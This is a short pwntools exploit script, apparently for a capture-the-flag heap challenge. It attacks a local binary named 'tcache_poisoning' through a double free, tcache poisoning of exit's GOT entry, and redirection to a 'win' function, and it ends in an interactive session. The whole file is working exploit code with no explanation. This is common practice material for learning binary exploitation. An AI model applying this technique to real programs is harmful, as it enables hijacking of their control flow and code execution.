from pwn import *
r = process("./tcache_poisoning")

def malloc(size,data ):
	r.sendlineafter("| select [1-3] :","1")
	r.sendlineafter("[?] size :",str(size))
	r.sendlineafter("[?] data :",data)
	log.info("allocating")

def free():
	r.sendlineafter("| select [1-3] :","2")
	log.info("freeing")

win_plt = 0x0000000000400827
exit_got = 0x000000601348
malloc(0x28,"A"*8)

free()
free()

malloc(0x28,p64(exit_got))
malloc(0x28,p8(0x00))
malloc(0x28,p64(win_plt))

r.interactive()